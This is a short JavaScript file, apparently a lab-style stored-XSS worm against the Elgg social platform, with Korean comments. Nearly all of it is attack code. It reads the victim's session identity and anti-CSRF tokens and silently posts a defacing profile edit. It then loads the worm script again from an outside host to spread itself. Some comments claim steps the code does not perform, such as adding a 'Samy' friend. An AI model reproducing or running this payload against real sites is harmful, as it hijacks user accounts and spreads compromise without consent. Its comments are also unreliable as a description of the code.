// xss_worm.js

// 웜 코드: 피해자의 프로필을 수정하고, 사용자 "Samy"를 추가하며, 자가 전파
var userName = "&name=" + elgg.session.user.name;
var guid = "&guid=" + elgg.session.user.guid;
var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
var desc = encodeURIComponent("Your profile has been hacked by the worm!");
var content = "description=" + desc + userName + guid + ts + token;
var sendurl = "/action/profile/edit";
var samygid = 49;

if (elgg.session.user.guid != samygid) {
    var Ajax = null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(content);
}

// 웜을 피해자의 프로필에 복사하여 전파
var wormScript = document.createElement('script');
wormScript.src = 'http://www.example.com/xss_worm.js';
document.body.appendChild(wormScript);
